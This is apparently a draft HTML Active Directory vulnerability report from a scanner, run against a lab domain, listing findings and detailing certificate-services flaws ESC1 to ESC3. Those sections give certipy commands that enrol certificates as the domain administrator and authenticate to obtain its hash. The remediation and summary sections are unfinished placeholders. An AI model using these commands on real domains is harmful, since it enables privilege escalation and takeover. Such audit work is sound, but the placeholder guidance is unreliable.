<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>test.local Vulnerability Report</title>
    <link rel="stylesheet" href="styles.css">
    <link rel="icon" type="image/x-icon" href="/Private/Report/Images/favicon-32x32.png">
</head>

<body>
    <div class="banner">
        <img src="./Images/kerberos-text2.png" alt="ADScanner logo" class="banner-img">
    </div>
    <div class="main-header">Domain vulnerability report for test.local</div>
    <!-- Risk overall section -->
    <div class="risk-overall">
        <div class="left-image"> <img src="./Images/Risk-scores/Critical.png" alt="Overall risk score">
        </div>
        <div class="risk-overall-text">
            <h1>Domain risk level: 1856 / 100</h1>
            <p>The maximum score is 100, anything above this presents a significant risk to ransomware.</p>
            <p>Attackers will always exploit the path of least resistance (higher scores) - low hanging fruit.</p>
            <a href="#category-summary">See score breakdown table</a>
        </div>
    </div>
    <!-- Executive summary section -->
    <div class="summary">
        <!-- Left section for the tables -->
        <div class="left-section">
            <div class="table-container">
                <table class="summary-table">
                    <thead>
                        <tr>
                            <th colspan="2">Details when ran</th>
                        </tr>
                        <tr>
                            <td>Domain Assessed</td>
                            <td>test.local</td>
                        </tr>
                        <tr>
                            <td>Ran as User</td>
                            <td>TEST\jack</td>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td>Ran on Host</td>
                            <td>CA.test.local</td>
                        </tr>
                        <tr>
                            <td>Date and Time</td>
                            <td>03/14/2024 15:28:11</td>
                        </tr>
                        <tr>
                            <td>Time to Run</td>
                            <td>53.2504325</td>
                        </tr>
                    </tbody>
                </table>
            </div>
            <div class="table-container">
                <table class="summary-table" id="category-summary">
                    <thead>
                        <tr>
                            <th>Category</th>
                            <th>Risk Score</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td>Kerberos</td>
                            <td class="category-riskcritical">258</td>
                        </tr>
                        <tr>
                            <td>PKI</td>
                            <td class="category-riskcritical">600</td>
                        </tr>
                        <tr>
                            <td>RBAC</td>
                            <td class="category-riskcritical">159</td>
                        </tr>
                        <tr>
                            <td>ACLs</td>
                            <td class="category-riskcritical">425</td>
                        </tr>
                        <tr>
                            <td>Passwords</td>
                            <td class="category-riskcritical">164</td>
                        </tr>
                        <tr>
                            <td>MISC</td>
                            <td class="category-riskcritical">110</td>
                        </tr>
                        <tr>
                            <td>Legacy</td>
                            <td class="category-riskcritical">140</td>
                        </tr>
                    </tbody>
                </table>
            </div>
        </div>
        <!-- Right section for the executive summary -->
        <div class="executive-summary">
            <h2>Executive Summary (GPT to contextualize)</h2>
            <p>ADscanner was commissioned to perform a vulnerability assessment against the test.local Active Directory
                domain to ensure correct security configuration and operation of the Directory.
                The audit indicates that the security of the Active Directory is reduced by the X, Y & Z. a number of
                misconfigurations significantly increases the attack surface of Active Directory, and therefore the
                network could be exploited by a determined attacker deploying ransomware and malware.</p>
            <p>ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the
                rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this
                in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill
                the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this
                in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill
                the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this
                in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill
                the rest of this in...</p>
            <p>ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the
                rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this
                in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill
                the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this
                in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill
                the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this
                in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill
                the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this
                in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill
                the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this
                in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...</p>
            <p>ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the
                rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this
                in...ChatGPT will fill the rest of this in...</p>
        </div>
    </div>
    <!-- Risk prioritisation section -->
    <div class="risk-summary-container">
        <div class="risk-summary-heading">
            <h2>Risk Prioritisation Summary</h2>
            <p>The table below summarizes the number and severity of findings in order of decreasing risk. Full
                details can be found by clicking on each vulnerability which will take you to the relevant technical
                section.</p>
        </div>
        <table class="risk-prioritisation-summary">
            <thead>
                <tr>
                    <th class="risk-column">Risk</th>
                    <th class="technique-column">Issue</a></th>
                    <th class="category-column">Category</th>
                    <th class="score-column">Score</th>
                </tr>
            </thead>
            <tbody>
                <tr class="critical">
                    <td>Critical</td>
                    <td><a href="#ESC8">ESC8</a></td>
                    <td>PKI</td>
                    <td>50</td>
                </tr>
                <tr class="critical">
                    <td>Critical</td>
                    <td><a href="#Highly-privileged-Kerberoastable-user-with-a-weak-password">Highly privileged
                            Kerberoastable user with a weak password</a></td>
                    <td>Kerberos</td>
                    <td>50</td>
                </tr>
                <tr class="critical">
                    <td>Critical</td>
                    <td><a href="#ESC6">ESC6</a></td>
                    <td>PKI</td>
                    <td>50</td>
                </tr>
                <tr class="critical">
                    <td>Critical</td>
                    <td><a href="#ESC7">ESC7</a></td>
                    <td>PKI</td>
                    <td>50</td>
                </tr>
                <tr class="critical">
                    <td>Critical</td>
                    <td><a href="#Low-privileged-principal-has-DCSync-rights">Low privileged principal has DCSync
                            rights</a></td>
                    <td>ACLs</td>
                    <td>50</td>
                </tr>
                <tr class="critical">
                    <td>Critical</td>
                    <td><a href="#Low-privileged-principal-has-dangerous-RBCD-rights">Low privileged principal has
                            dangerous RBCD rights</a></td>
                    <td>ACLs</td>
                    <td>50</td>
                </tr>
                <tr class="critical">
                    <td>Critical</td>
                    <td><a href="#Highly-privileged-ASREP-roastable-user-with-a-weak-password">Highly privileged
                            ASREP-roastable user with a weak password</a></td>
                    <td>Kerberos</td>
                    <td>50</td>
                </tr>
                <tr class="critical">
                    <td>Critical</td>
                    <td><a href="#Low-privileged-principal-has-dangerous-rights">Low privileged principal has dangerous
                            rights</a></td>
                    <td>ACLs</td>
                    <td>50</td>
                </tr>
                <tr class="critical">
                    <td>Critical</td>
                    <td><a href="#ESC5">ESC5</a></td>
                    <td>PKI</td>
                    <td>50</td>
                </tr>
                <tr class="critical">
                    <td>Critical</td>
                    <td><a href="#ESC3">ESC3</a></td>
                    <td>PKI</td>
                    <td>50</td>
                </tr>
                <tr class="critical">
                    <td>Critical</td>
                    <td><a href="#ESC4">ESC4</a></td>
                    <td>PKI</td>
                    <td>50</td>
                </tr>
                <tr class="critical">
                    <td>Critical</td>
                    <td><a href="#ESC2">ESC2</a></td>
                    <td>PKI</td>
                    <td>50</td>
                </tr>
                <tr class="critical">
                    <td>Critical</td>
                    <td><a href="#ESC1">ESC1</a></td>
                    <td>PKI</td>
                    <td>50</td>
                </tr>
                <tr class="critical">
                    <td>Critical</td>
                    <td><a href="#ESC4">ESC4</a></td>
                    <td>PKI</td>
                    <td>50</td>
                </tr>
                <tr class="critical">
                    <td>Critical</td>
                    <td><a href="#ESC5">ESC5</a></td>
                    <td>PKI</td>
                    <td>50</td>
                </tr>
                <tr class="critical">
                    <td>Critical</td>
                    <td><a href="#ESC4">ESC4</a></td>
                    <td>PKI</td>
                    <td>50</td>
                </tr>
                <tr class="critical">
                    <td>Critical</td>
                    <td><a href="#ESC5">ESC5</a></td>
                    <td>PKI</td>
                    <td>50</td>
                </tr>
                <tr class="critical">
                    <td>Critical</td>
                    <td><a href="#Highly-privileged-user-does-not-require-a-password">Highly privileged user does not
                            require a password</a></td>
                    <td>Passwords</td>
                    <td>40</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#Low-privileged-principal-has-dangerous-rights">Low privileged principal has dangerous
                            rights</a></td>
                    <td>ACLs</td>
                    <td>35</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#Low-privileged-principal-has-dangerous-rights">Low privileged principal has dangerous
                            rights</a></td>
                    <td>ACLs</td>
                    <td>35</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#Low-privileged-principal-has-dangerous-RBCD-rights">Low privileged principal has
                            dangerous RBCD rights</a></td>
                    <td>ACLs</td>
                    <td>35</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#Low-privileged-principal-has-dangerous-rights">Low privileged principal has dangerous
                            rights</a></td>
                    <td>ACLs</td>
                    <td>35</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#Low-privileged-principal-has-dangerous-rights">Low privileged principal has dangerous
                            rights</a></td>
                    <td>ACLs</td>
                    <td>35</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#Low-privileged-principal-has-dangerous-RBCD-rights">Low privileged principal has
                            dangerous RBCD rights</a></td>
                    <td>ACLs</td>
                    <td>35</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#Low-privileged-principal-has-dangerous-rights">Low privileged principal has dangerous
                            rights</a></td>
                    <td>ACLs</td>
                    <td>35</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#Unrestricted-outbound-access">Unrestricted outbound access</a></td>
                    <td>MISC</td>
                    <td>35</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#Constrained-delegation">Constrained delegation</a></td>
                    <td>Kerberos</td>
                    <td>30</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#Outdated-Operating-Systems-found">Outdated Operating Systems found</a></td>
                    <td>Legacy</td>
                    <td>30</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#Resource-based-constrained-delegation">Resource-based constrained delegation</a></td>
                    <td>Kerberos</td>
                    <td>30</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#Unconstrained-delegation">Unconstrained delegation</a></td>
                    <td>Kerberos</td>
                    <td>30</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#Spooler-service-is-enabled-(authentication-coercion)-">Spooler service is enabled
                            (authentication coercion) </a></td>
                    <td>MISC</td>
                    <td>30</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#Modifiable-logon-script---see-baby2-for-example-exploitation">Modifiable logon script
                            - see baby2 for example exploitation</a></td>
                    <td>ACLs</td>
                    <td>30</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#Plaintext-credentials-found-readable-by-low-privileged-user">Plaintext credentials
                            found readable by low privileged user</a></td>
                    <td>Passwords</td>
                    <td>30</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#SMBv1-is-enabled-on-computers">SMBv1 is enabled on computers</a></td>
                    <td>Legacy</td>
                    <td>25</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#Password-length-requirement-is-less-than-12-characters">Password length requirement is
                            less than 12 characters</a></td>
                    <td>Passwords</td>
                    <td>25</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#LLMNR-is-vulnerable-to-layer-2-poisoning-attacks">LLMNR is vulnerable to layer 2
                            poisoning attacks</a></td>
                    <td>Legacy</td>
                    <td>25</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#Low-privileged-Kerberoastable-user-with-a-weak-password">Low privileged Kerberoastable
                            user with a weak password</a></td>
                    <td>Kerberos</td>
                    <td>25</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#NBT-NS-is-vulnerable-to-layer-2-poisoning-attacks">NBT-NS is vulnerable to layer 2
                            poisoning attacks</a></td>
                    <td>Legacy</td>
                    <td>25</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#mDNS-is-vulnerable-to-layer-2-poisoning-attacks">mDNS is vulnerable to layer 2
                            poisoning attacks</a></td>
                    <td>Legacy</td>
                    <td>25</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#Low-privileged-ASREP-roastable-user-with-a-weak-password">Low privileged
                            ASREP-roastable user with a weak password</a></td>
                    <td>Kerberos</td>
                    <td>25</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#Reversible-encryption-is-enabled">Reversible encryption is enabled</a></td>
                    <td>Passwords</td>
                    <td>20</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#Password-complexity-requirement-is-not-enabled">Password complexity requirement is not
                            enabled</a></td>
                    <td>Passwords</td>
                    <td>20</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#Schema-Admins-group-does-not-meet-the-benchmark-(maximum-0-users-required).">Schema
                            Admins group does not meet the benchmark (maximum 0 users required).</a></td>
                    <td>RBAC</td>
                    <td>20</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#Domain-anonymous-access-is-permitted-allowing-anonymous-access-to-the-domain">Domain
                            anonymous access is permitted allowing anonymous access to the domain</a></td>
                    <td>RBAC</td>
                    <td>20</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#Local-anonymous-access-is-permitted-allowing-anonymous-access-to-the-system">Local
                            anonymous access is permitted allowing anonymous access to the system</a></td>
                    <td>RBAC</td>
                    <td>20</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#Enterprise-Admins-group-does-not-meet-the-benchmark-(maximum-0-users-required).">Enterprise
                            Admins group does not meet the benchmark (maximum 0 users required).</a></td>
                    <td>RBAC</td>
                    <td>20</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#Inactive/stale-accounts-are-not-disabled-in-privileged-groups">Inactive/stale accounts
                            are not disabled in privileged groups</a></td>
                    <td>RBAC</td>
                    <td>20</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#Server-Operators-group-does-not-meet-the-benchmark-(maximum-0-users-required).">Server
                            Operators group does not meet the benchmark (maximum 0 users required).</a></td>
                    <td>RBAC</td>
                    <td>20</td>
                </tr>
                <tr class="medium">
                    <td>Medium</td>
                    <td><a href="#SMB-signing-is-not-enforced">SMB signing is not enforced</a></td>
                    <td>MISC</td>
                    <td>19</td>
                </tr>
                <tr class="medium">
                    <td>Medium</td>
                    <td><a href="#LDAP-signing-or-channel-binding-is-not-enforced">LDAP signing or channel binding is
                            not enforced</a></td>
                    <td>MISC</td>
                    <td>19</td>
                </tr>
                <tr class="medium">
                    <td>Medium</td>
                    <td><a
                            href="#Highly-privileged-account-does-not-have-the-'Account-is-sensitive-and-cannot-be-delegated'-flag-set">Highly
                            privileged account does not have the 'Account is sensitive and cannot be delegated' flag
                            set</a></td>
                    <td>RBAC</td>
                    <td>19</td>
                </tr>
                <tr class="medium">
                    <td>Medium</td>
                    <td><a href="#Suspicious-/-legacy-admin-account">Suspicious / legacy admin account</a></td>
                    <td>RBAC</td>
                    <td>15</td>
                </tr>
                <tr class="medium">
                    <td>Medium</td>
                    <td><a href="#Standard-user-does-not-require-a-password">Standard user does not require a
                            password</a></td>
                    <td>Passwords</td>
                    <td>15</td>
                </tr>
                <tr class="medium">
                    <td>Medium</td>
                    <td><a href="#Outdated,-but-disabled,-Operating-Systems-found">Outdated, but disabled, Operating
                            Systems found</a></td>
                    <td>Legacy</td>
                    <td>10</td>
                </tr>
                <tr class="low">
                    <td>Low</td>
                    <td><a href="#The-password-history-count-is-less-than-24">The password history count is less than
                            24</a></td>
                    <td>Passwords</td>
                    <td>9</td>
                </tr>
                <tr class="low">
                    <td>Low</td>
                    <td><a href="#Disabled-ASREP-roastable-user">Disabled ASREP-roastable user</a></td>
                    <td>Kerberos</td>
                    <td>9</td>
                </tr>
                <tr class="low">
                    <td>Low</td>
                    <td><a href="#Disabled-Kerberoastable-account">Disabled Kerberoastable account</a></td>
                    <td>Kerberos</td>
                    <td>9</td>
                </tr>
                <tr class="low">
                    <td>Low</td>
                    <td><a href="#Inactive/stale-accounts-are-not-disabled">Inactive/stale accounts are not disabled</a>
                    </td>
                    <td>RBAC</td>
                    <td>5</td>
                </tr>
                <tr class="low">
                    <td>Low</td>
                    <td><a href="#Potential-for-non-admin-users-can-add-computers-to-the-domain">Potential for non-admin
                            users can add computers to the domain</a></td>
                    <td>MISC</td>
                    <td>5</td>
                </tr>
                <tr class="low">
                    <td>Low</td>
                    <td><a href="#Disabled-account-does-not-require-a-password">Disabled account does not require a
                            password</a></td>
                    <td>Passwords</td>
                    <td>5</td>
                </tr>
                <tr class="information">
                    <td>Informational</td>
                    <td><a href="#Domain-effiency-improvement---empty-Organizational-Units">Domain effiency improvement
                            - empty Organizational Units</a></td>
                    <td>MISC</td>
                    <td>1</td>
                </tr>
                <tr class="information">
                    <td>Informational</td>
                    <td><a href="#Domain-effiency-improvement---unlinked-GPOs">Domain effiency improvement - unlinked
                            GPOs</a></td>
                    <td>MISC</td>
                    <td>1</td>
                </tr>
            </tbody>
        </table>
    </div>
    <!-- Technical section -->
    <div class="main-header">Technical section</div>
    <div class="finding-header">Domain info</div>
    <div class="domain-info">
        <p>This section provides a general overview of the Active Directory domain, which can be taken as an indication
            of the size and complexity of the domain. Before appreciating any risks it is important to understand which
            assets within the domain require protecting.</p>
        <table>
            <th>Category</th>
            <th>Value</th>
            <tr>
                <td class="grey">Domain:</td>
                <td>test.local</td>
            </tr>
            <tr>
                <td class="grey">FunctionalLevel:</td>
                <td>Windows2016Domain</td>
            </tr>
            <tr>
                <td class="grey">DomainControllers:</td>
                <td>DC.test.local</td>
            </tr>
            <tr>
                <td class="grey">Users:</td>
                <td>444</td>
            </tr>
            <tr>
                <td class="grey">Groups:</td>
                <td>49</td>
            </tr>
            <tr>
                <td class="grey">Computers:</td>
                <td>11</td>
            </tr>
            <tr>
                <td class="grey">Trusts:</td>
                <td>None</td>
            </tr>
            <tr>
                <td class="grey">OUs:</td>
                <td>225</td>
            </tr>
            <tr>
                <td class="grey">GPOs:</td>
                <td>5</td>
            </tr>
            <tr>
                <td class="grey">CertificateAuthority:</td>
                <td>CA.test.local, test-CA-CA</td>
            </tr>
            <tr>
                <td class="grey">CAtemplates:</td>
                <td>18</td>
            </tr>
            <tr>
                <td class="grey">CertificateTemplates:</td>
                <td>ESC4ACL-template, ESC4-template, ESC3-enrolltemplate, ESC3-template, ESC2-template, ESC1-template,
                    Workstation, DirectoryEmailReplication, DomainControllerAuthentication, KerberosAuthentication,
                    EFSRecovery, EFS, DomainController, WebServer, Machine, User, SubCA, Administrator</td>
            </tr>
        </table>
    </div>

    <div class="finding-header">PKI</div>
        <div class="finding-container">
        <table>
            <thead>
                <tr>
                    <th class="table-header">Issue</th>
                    <th class="table-header">Risk</th>
                </tr>
            </thead>
            <tbody>                <tr>
                    <td class="toggle" id="ESC1"><u>ESC1</u></td>
                    <td class="finding-riskcritical">CRITICAL</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Low-privileged users can impersonate a domain administrator by enrolling in a vulnerable certificate template and supplying a SAN.</td>
                                        <td>T-15940</td>
                                        <td>+50</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Template Name</td><td>ESC1-template</td></tr>
                                            <tr><td class="grey">DistinguishedName</td><td>CN=ESC1-template,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=test,DC=local</td></tr>
                                            <tr><td class="grey">IdentityReference</td><td>TEST\Domain Users</td></tr>
                                            <tr><td class="grey">ActiveDirectoryRights</td><td>ReadProperty, WriteProperty, ExtendedRight</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>ESC1 is a vulnerability where a certificate template permits Client Authentication and allows a low-privileged enrollee to supply a different username than their own using a Subject Alternative Name (SAN) without manager approval.
                                            A SAN is an extension that allows multiple identities to be bound to a certificate beyond just the subject of the certificate. A common use for SANs is supplying additional host names for HTTPS certificates. For example, if a web server hosts content for multiple domains, each applicable domain could be included in the SAN so that the web server only needs a single HTTPS certificate instead of one for each domain. This is all well and good for HTTPS certificates, but when combined with certificates that allow for domain authentication, a dangerous scenario can arise.</p>
                                            <p>This allows a low-privileged user to enroll in ESC1-template supplying a SAN of Administrator, and then authenticate as the domain administrator.</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2>">Link 1</a></p>
                                            <p><a href="https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. A low-privileged user can remotely enumerate vulnerable certificate templates using certipy.
                                                    </p>
                                                    <p class="code">python3 entry.py find -u test@test.local -p 'Password123!' -stdout -vulnerable</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC1-1.png"
                                                        alt="Finding ESC1">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. A low-privileged user can enroll in the certificate template specifying a UPN of a domain administrator in the SAN.</p>
                                                    <p class="code">python3 entry.py req -u test@test.local -p 'Password123!' -ca test-CA-CA -target ca.test.local -template ESC1-template -upn administrator@test.local -dns dc.test.local</p>
                                                    <p>The low-privileged user can then use this certificate with PKINIT to authenticate as the domain administrator and obtain their NTLM hash, allowing full impersonation and domain privilege escalation.</p>
                                                    <p class="code">certipy auth -pfx administrator_dc.pfx -dc-ip 192.168.10.141</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC1-2.png"
                                                        alt="Exploiting ESC1">
                                                </span>
                                            </div>
                                            <hr>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>Remove ability to supply SAN or restrict who can enroll in cert (to prviileged users only)</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>                <tr>
                    <td class="toggle" id="ESC2"><u>ESC2</u></td>
                    <td class="finding-riskcritical">CRITICAL</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Low-privileged users can impersonate a domain administrator by enrolling in a vulnerable certificate template used for any purpose.</td>
                                        <td>T-15940</td>
                                        <td>+50</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Template Name</td><td>ESC2-template</td></tr>
                                            <tr><td class="grey">DistinguishedName</td><td>CN=ESC2-template,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=test,DC=local</td></tr>
                                            <tr><td class="grey">IdentityReference</td><td>TEST\Domain Users</td></tr>
                                            <tr><td class="grey">ActiveDirectoryRights</td><td>ReadProperty, WriteProperty, ExtendedRight</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>ESC2 is a vulnerability where a certificate template can be used for ANY purpose for which a low-privileged user can enroll. Since the certificate can be used for any purpose, it can be used for the same technique as with ESC3 for most certificate templates. This invovles enrolling in the vulnerable certificate template, then using that enrolled certificate to enroll another certiifcate on behalf of another user (i.e a domain admin) permitted by the any purpose EKU.</p>
                                            <p>This allows a low-privileged user to enroll in ESC2-template, then use the certificate to enroll in another certificate template on behalf of a domain admin (permitted as the certificate can be used for any purpose).</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2>">Link 1</a></p>
                                            <p><a href="https://labs.lares.com/adcs-exploits-investigations-pt2/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. A low-privileged user can remotely enumerate vulnerable certificate templates using certipy.
                                                    </p>
                                                    <p class="code">python3 entry.py find -u test@test.local -p 'Password123!' -stdout -vulnerable</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC2-1.png"
                                                        alt="Finding ESC1">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. A low-privileged user can enroll in the certificate template.</p>
                                                    <p class="code">python3 entry.py req -u test@test.local -p 'Password123!' -ca test-CA-CA -target ca.test.local -template ESC2-template</p>
                                                    <p>The low-privileged user can then use the ANY purpose certificate to request a certificate in the "User" certificate template on behalf of a domain administrator</p>
                                                    <p class="code">python3 entry.py req -u test@test.local -p 'Password123!' -ca test-CA-CA -target ca.test.local -template User -on-behalf-of 'test\administrator' -pfx test.pfx</p>
                                                    <p>The low-privileged user can then use this domain admin certificate with PKINIT to authenticate as the domain administrator and obtain their NTLM hash, allowing full impersonation and domain privilege escalation.</p>
                                                    <p class="code">certipy auth -pfx administrator.pfx -dc-ip 192.168.10.141</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC2-2.png"
                                                        alt="Exploiting ESC1">
                                                </span>
                                            </div>
                                            <hr>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>ESC2 remediation</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>                <tr>
                    <td class="toggle" id="ESC3"><u>ESC3</u></td>
                    <td class="finding-riskcritical">CRITICAL</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Low-privileged users can impersonate a domain administrator by enrolling in a vulnerable certificate template on behalf of another user.</td>
                                        <td>T-15940</td>
                                        <td>+50</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Template Name</td><td>ESC3-CRA</td></tr>
                                            <tr><td class="grey">DistinguishedName</td><td>CN=ESC3-CRA,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=test,DC=local</td></tr>
                                            <tr><td class="grey">IdentityReference</td><td>TEST\Domain Users</td></tr>
                                            <tr><td class="grey">ActiveDirectoryRights</td><td>ReadProperty, WriteProperty, ExtendedRight</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>ESC3 is a vulnerability where a certificate template allows a low-privileged user to enroll for a certificate on behalf of another user by specifying the Certificate Request Agent EKU. This vulnerability is present when two certificate templates can be enrolled in by low privileged user, where, one allows the Certificate Request Agent EKU (to requesst certificate on behalf of other user) and another allows client authentication.</p>
                                            <p>This allows a low-privileged user to enroll in ESC3-CRA, then use the certificate obtained to request an additional certificate (co-sign a Certificate Signing Request (CSR)) on behalf of a domain admin in another template used for client authentication to impersonate them.</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2>">Link 1</a></p>
                                            <p><a href="https://labs.lares.com/adcs-exploits-investigations-pt2/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. A low-privileged user can remotely enumerate vulnerable certificate templates using certipy.
                                                    </p>
                                                    <p class="code">python3 entry.py find -u test@test.local -p 'Password123!' -stdout -vulnerable</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC3-1.png"
                                                        alt="Finding ESC3">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. A low-privileged user can enroll in the certificate template that permits enrolling on behalf of another user (ESC3-CRA - has the Certificate Request Agent EKU).</p>
                                                    <p class="code">python3 entry.py req -u test@test.local -p 'Password123!' -ca test-CA-CA -target ca.test.local -template ESC3-CRA</p>
